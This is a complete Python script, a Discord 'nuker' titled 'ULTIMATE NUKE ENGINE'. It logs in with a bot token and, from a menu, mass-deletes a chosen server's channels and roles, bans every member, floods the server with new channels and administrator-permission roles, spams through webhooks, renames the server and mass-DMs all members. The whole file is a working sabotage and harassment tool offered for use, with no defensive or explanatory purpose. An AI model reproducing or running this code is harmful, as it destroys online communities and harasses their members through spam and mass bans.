#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import random
import asyncio
import discord
from discord.ext import commands
from colorama import init, Fore, Style
import time

init(autoreset=True)

RED = Fore.RED + Style.BRIGHT
GREEN = Fore.GREEN + Style.BRIGHT
YELLOW = Fore.YELLOW + Style.BRIGHT
CYAN = Fore.CYAN + Style.BRIGHT
WHITE = Fore.WHITE + Style.BRIGHT
RESET = Style.RESET_ALL

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def center(txt, w=90):
    return txt.center(w)

def pcenter(txt, col=RED):
    print(col + center(txt) + RESET)

LOGO = f"""
{RED}
██████╗  ██████╗ ███████╗███████╗
╚════██╗██╔═████╗██╔════╝██╔════╝
 █████╔╝██║██╔██║███████╗███████╗
 ╚═══██╗████╔╝██║╚════██║╚════██║
██████╔╝╚██████╔╝███████║███████║
╚═════╝  ╚═════╝ ╚══════╝╚══════╝
"""

BANNER = f"""
{RED}╔══════════════════════════════════════════════════════════════════════╗
{RED}║        ULTIMATE NUKE ENGINE        ║
{RED}║        PROGRAMMED BY 3ZF           ║
{RED}╚══════════════════════════════════════════════════════════════════════╝{RESET}
"""

def show(user=None):
    clear()
    print(LOGO)
    print(BANNER)
    if user:
        pcenter(f"[+] LOGGED IN AS: {user}", CYAN)
        print()

pcenter("ENTER TOKEN", YELLOW)
print()
TOKEN = input(CYAN + center("> TOKEN: ") + RESET).strip()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

guild = None
run = True
BATCH = 5000

@bot.event
async def on_ready():
    global guild
    show(bot.user.name)
    servers = sorted(list(bot.guilds), key=lambda x: x.member_count, reverse=True)
    pcenter(f"SERVERS ({len(servers)})", YELLOW)
    print()
    for i, s in enumerate(servers):
        pcenter(f"{i+1}. {s.name[:30]} (MEMBERS: {s.member_count})", WHITE)
    print()
    while True:
        try:
            c = input(CYAN + center("> CHOOSE SERVER NUMBER: ") + RESET).strip()
            idx = int(c) - 1
            if 0 <= idx < len(servers):
                guild = servers[idx]
                break
        except:
            pass
        pcenter("[-] INVALID NUMBER", RED)
    print()
    pcenter(f"[+] TARGET: {guild.name}", GREEN)
    await menu()

async def menu():
    global run
    while run:
        print()
        pcenter("┌─────────────────────────────────────────────────────────────┐", RED)
        pcenter("│ [1] DELETE CHANNELS   |   [2] DELETE ROLES     │", RED)
        pcenter("│ [3] BAN MEMBERS       |   [4] CREATE CHANNELS  │", RED)
        pcenter("│ [5] CREATE ROLES      |   [6] WEBHOOK SPAM     │", RED)
        pcenter("│ [7] CHANGE SERVER NAME|   [8] DM ALL MEMBERS   │", RED)
        pcenter("│ [9] EXIT                                        │", RED)
        pcenter("└─────────────────────────────────────────────────────────────┘", RED)
        print()
        pcenter("            PROGRAMMED BY 3ZF", RED)
        print()
        ch = input(CYAN + center("> CHOOSE OPTION: ") + RESET).strip()
        
        if ch == "1": await delch()
        elif ch == "2": await delrol()
        elif ch == "3": await banall()
        elif ch == "4": await crch()
        elif ch == "5": await crrol()
        elif ch == "6": await webspam()
        elif ch == "7": await chname()
        elif ch == "8": await dmall()
        elif ch == "9":
            run = False
            pcenter("[+] EXITING...", RED)
            await bot.close()
            sys.exit(0)
        else:
            pcenter("[-] INVALID OPTION", RED)
            await asyncio.sleep(0.2)

async def delch():
    pcenter("[+] DELETING CHANNELS AT MAX SPEED...", YELLOW)
    st = time.time()
    try:
        chs = list(guild.channels)
        if not chs:
            pcenter("[-] NO CHANNELS", RED)
            await asyncio.sleep(0.2)
            return
        total = len(chs)
        done = 0
        for i in range(0, total, BATCH):
            chunk = chs[i:i+BATCH]
            res = await asyncio.gather(*[c.delete() for c in chunk], return_exceptions=True)
            done += sum(1 for r in res if not isinstance(r, Exception))
            pcenter(f"PROGRESS: {(done/total)*100:.1f}% ({done}/{total})", CYAN)
        et = time.time() - st
        pcenter(f"[+] {done} CHANNELS DELETED IN {et:.2f}S", GREEN)
        pcenter(f"SPEED: ~{done/et:.1f} CH/S", CYAN)
    except Exception as e:
        pcenter(f"[-] {str(e)[:50]}", RED)
    await asyncio.sleep(0.3)

async def delrol():
    pcenter("[+] DELETING ROLES AT MAX SPEED...", YELLOW)
    st = time.time()
    try:
        rols = [r for r in guild.roles if r.name != "@everyone"]
        if not rols:
            pcenter("[-] NO ROLES", RED)
            await asyncio.sleep(0.2)
            return
        total = len(rols)
        done = 0
        for i in range(0, total, BATCH):
            chunk = rols[i:i+BATCH]
            res = await asyncio.gather(*[r.delete() for r in chunk], return_exceptions=True)
            done += sum(1 for r in res if not isinstance(r, Exception))
            pcenter(f"PROGRESS: {(done/total)*100:.1f}% ({done}/{total})", CYAN)
        et = time.time() - st
        pcenter(f"[+] {done} ROLES DELETED IN {et:.2f}S", GREEN)
        pcenter(f"SPEED: ~{done/et:.1f} ROLES/S", CYAN)
    except Exception as e:
        pcenter(f"[-] {str(e)[:50]}", RED)
    await asyncio.sleep(0.3)

async def banall():
    conf = input(CYAN + center("> BAN ALL? (YES/NO): ") + RESET).lower()
    if conf != "yes":
        pcenter("[-] CANCELLED", RED)
        await asyncio.sleep(0.2)
        return
    pcenter("[+] BANNING MEMBERS AT MAX SPEED...", YELLOW)
    st = time.time()
    try:
        mems = [m for m in guild.members if m.id != bot.user.id and not m.bot]
        if not mems:
            pcenter("[-] NO MEMBERS", RED)
            await asyncio.sleep(0.2)
            return
        total = len(mems)
        done = 0
        for i in range(0, total, BATCH):
            chunk = mems[i:i+BATCH]
            res = await asyncio.gather(*[m.ban(reason="NUKE") for m in chunk], return_exceptions=True)
            done += sum(1 for r in res if not isinstance(r, Exception))
            pcenter(f"PROGRESS: {(done/total)*100:.1f}% ({done}/{total})", CYAN)
        et = time.time() - st
        pcenter(f"[+] {done} MEMBERS BANNED IN {et:.2f}S", GREEN)
        pcenter(f"SPEED: ~{done/et:.1f} MEMBERS/S", CYAN)
    except Exception as e:
        pcenter(f"[-] {str(e)[:50]}", RED)
    await asyncio.sleep(0.3)

async def crch():
    pcenter("ENTER CHANNEL COUNT", YELLOW)
    print()
    cnt = int(input(CYAN + center("> COUNT: ") + RESET).strip())
    if cnt <= 0:
        pcenter("[-] INVALID", RED)
        await asyncio.sleep(0.2)
        return
    pcenter("ENTER 3 NAMES", YELLOW)
    names = []
    for i in range(3):
        nm = input(CYAN + center(f"> NAME {i+1}: ") + RESET).strip()
        names.append(nm if nm else f"CH-{i+1}")
    pcenter(f"[+] CREATING {cnt} CHANNELS AT MAX SPEED...", YELLOW)
    st = time.time()
    try:
        tasks = []
        for i in range(cnt):
            nm = names[i % 3]
            if i >= 100:
                nm = f"{nm}-{random.randint(1, 9999)}"
            tasks.append(guild.create_text_channel(nm))
        done = 0
        for i in range(0, len(tasks), BATCH):
            chunk = tasks[i:i+BATCH]
            res = await asyncio.gather(*chunk, return_exceptions=True)
            done += sum(1 for r in res if not isinstance(r, Exception))
            pcenter(f"PROGRESS: {(done/cnt)*100:.1f}% ({done}/{cnt})", CYAN)
        et = time.time() - st
        pcenter(f"[+] {done} CHANNELS CREATED IN {et:.2f}S", GREEN)
        pcenter(f"SPEED: ~{done/et:.1f} CH/S", CYAN)
    except Exception as e:
        pcenter(f"[-] {str(e)[:50]}", RED)
    await asyncio.sleep(0.3)

async def crrol():
    pcenter("ENTER ROLE COUNT", YELLOW)
    print()
    cnt = int(input(CYAN + center("> COUNT: ") + RESET).strip())
    if cnt <= 0:
        pcenter("[-] INVALID", RED)
        await asyncio.sleep(0.2)
        return
    pcenter("ENTER 3 NAMES", YELLOW)
    names = []
    for i in range(3):
        nm = input(CYAN + center(f"> NAME {i+1}: ") + RESET).strip()
        names.append(nm if nm else f"ROLE-{i+1}")
    cols = [discord.Color.red(), discord.Color.blue(), discord.Color.green(), 
            discord.Color.purple(), discord.Color.gold(), discord.Color.orange()]
    pcenter(f"[+] CREATING {cnt} ADMIN ROLES AT MAX SPEED...", YELLOW)
    st = time.time()
    try:
        tasks = []
        for i in range(cnt):
            nm = names[i % 3]
            if i >= 100:
                nm = f"{nm}-{random.randint(1, 9999)}"
            col = random.choice(cols)
            tasks.append(guild.create_role(name=nm, color=col, permissions=discord.Permissions(administrator=True)))
        done = 0
        for i in range(0, len(tasks), BATCH):
            chunk = tasks[i:i+BATCH]
            res = await asyncio.gather(*chunk, return_exceptions=True)
            done += sum(1 for r in res if not isinstance(r, Exception))
            pcenter(f"PROGRESS: {(done/cnt)*100:.1f}% ({done}/{cnt})", CYAN)
        et = time.time() - st
        pcenter(f"[+] {done} ROLES CREATED IN {et:.2f}S", GREEN)
        pcenter(f"SPEED: ~{done/et:.1f} ROLES/S", CYAN)
    except Exception as e:
        pcenter(f"[-] {str(e)[:50]}", RED)
    await asyncio.sleep(0.3)

async def webspam():
    pcenter("WEBHOOK SPAM", YELLOW)
    print()
    msg = input(CYAN + center("> CONTENT: ") + RESET).strip()
    if not msg: msg = "NUKE"
    amt = int(input(CYAN + center("> AMOUNT: ") + RESET).strip())
    if amt <= 0:
        pcenter("[-] INVALID", RED)
        await asyncio.sleep(0.2)
        return
    pcenter(f"[+] SENDING {amt} WEBHOOK MESSAGES...", YELLOW)
    try:
        whs = await guild.webhooks()
        if not whs:
            pcenter("[-] NO WEBHOOKS, CREATING...", RED)
            chs = guild.text_channels
            if chs:
                wh = await chs[0].create_webhook(name="NUKER")
                whs = [wh]
            else:
                pcenter("[-] NO CHANNELS", RED)
                await asyncio.sleep(0.2)
                return
        tasks = []
        for _ in range(amt):
            for w in whs:
                tasks.append(w.send(msg))
        done = 0
        for i in range(0, len(tasks), BATCH):
            chunk = tasks[i:i+BATCH]
            res = await asyncio.gather(*chunk, return_exceptions=True)
            done += sum(1 for r in res if not isinstance(r, Exception))
            pcenter(f"PROGRESS: {(done/len(tasks))*100:.1f}% ({done}/{len(tasks)})", CYAN)
        pcenter(f"[+] {done} WEBHOOKS SENT", GREEN)
    except Exception as e:
        pcenter(f"[-] {str(e)[:50]}", RED)
    await asyncio.sleep(0.3)

async def chname():
    nm = input(CYAN + center("> NEW NAME: ") + RESET).strip()
    if not nm:
        pcenter("[-] EMPTY", RED)
        await asyncio.sleep(0.2)
        return
    try:
        await guild.edit(name=nm)
        pcenter(f"[+] NAME CHANGED TO: {nm}", GREEN)
    except Exception as e:
        pcenter(f"[-] {str(e)[:50]}", RED)
    await asyncio.sleep(0.2)

async def dmall():
    pcenter("DM ALL MEMBERS", YELLOW)
    print()
    cnt = int(input(CYAN + center("> MSGS PER MEMBER: ") + RESET).strip())
    if cnt <= 0:
        pcenter("[-] INVALID", RED)
        await asyncio.sleep(0.2)
        return
    msg = input(CYAN + center("> MESSAGE: ") + RESET).strip()
    if not msg: msg = "NUKE"
    mems = [m for m in guild.members if m.id != bot.user.id and not m.bot]
    if not mems:
        pcenter("[-] NO MEMBERS", RED)
        await asyncio.sleep(0.2)
        return
    pcenter(f"[+] SENDING {cnt} DMS TO {len(mems)} MEMBERS...", YELLOW)
    st = time.time()
    try:
        tasks = []
        for m in mems:
            for _ in range(cnt):
                tasks.append(m.send(msg))
        done = 0
        for i in range(0, len(tasks), BATCH):
            chunk = tasks[i:i+BATCH]
            res = await asyncio.gather(*chunk, return_exceptions=True)
            done += sum(1 for r in res if not isinstance(r, Exception))
            pcenter(f"PROGRESS: {(done/len(tasks))*100:.1f}% ({done}/{len(tasks)})", CYAN)
        et = time.time() - st
        pcenter(f"[+] {done} DMS SENT IN {et:.2f}S", GREEN)
        pcenter(f"SPEED: ~{done/et:.1f} DMS/S", CYAN)
    except Exception as e:
        pcenter(f"[-] {str(e)[:50]}", RED)
    await asyncio.sleep(0.3)

if __name__ == "__main__":
    try:
        bot.run(TOKEN, reconnect=True)
    except discord.LoginFailure:
        pcenter("[-] INVALID TOKEN", RED)
        sys.exit(1)
    except Exception as e:
        pcenter(f"[-] {str(e)[:50]}", RED)
        sys.exit(1)
